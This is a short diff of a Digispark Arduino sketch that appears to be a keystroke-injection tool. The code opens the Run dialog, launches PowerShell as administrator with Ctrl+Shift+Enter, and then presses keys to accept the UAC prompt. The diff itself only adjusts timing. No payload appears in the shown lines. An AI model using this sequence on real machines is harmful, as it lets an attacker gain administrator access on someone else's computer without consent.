@@ -21,9 +21,9 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(1500);
   DigiKeyboard.print("powershell");
-  DigiKeyboard.delay(1500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT); // KeyStroke function only allows one KEY, but as many MOD as you wish, separed by pipe
-  DigiKeyboard.delay(800);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT); // KeyStroke function only allows one KEY, but as many MOD as you wish. This allwos to send multiple
+  DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
